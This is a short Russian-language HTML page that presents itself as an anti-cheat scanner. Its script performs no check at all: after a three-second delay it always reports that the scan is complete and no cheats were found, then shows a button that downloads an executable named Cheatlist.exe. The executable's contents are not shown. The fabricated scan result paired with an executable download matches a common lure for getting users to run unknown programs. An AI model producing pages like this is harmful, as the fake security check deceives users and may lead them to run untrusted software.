<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Проверка на читы</title>
    <style>
        body {
            background-color: #111;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 100px;
        }

        button {
            padding: 15px 30px;
            font-size: 18px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 20px;
        }

        .check-btn {
            background-color: #e74c3c;
            color: white;
        }

        .download-btn {
            background-color: #2ecc71;
            color: white;
            display: none;
        }

        #status {
            margin-top: 30px;
            font-size: 20px;
        }
    </style>
</head>
<body>

    <h1>Anti-Cheat Проверка</h1>

    <button class="check-btn" onclick="startCheck()">Проверить на читы</button>

    <div id="status"></div>

    <br>

    <a href="Cheatlist.exe" download>
        <button class="download-btn" id="downloadBtn">Скачать файл</button>
    </a>

    <script>
        function startCheck() {
            const status = document.getElementById("status");
            const downloadBtn = document.getElementById("downloadBtn");

            status.innerHTML = "Сканирование...";
            downloadBtn.style.display = "none";

            setTimeout(() => {
                status.innerHTML = "Проверка завершена ✔ Читы не обнаружены";
                downloadBtn.style.display = "inline-block";
            }, 3000);
        }
    </script>

</body>
</html>
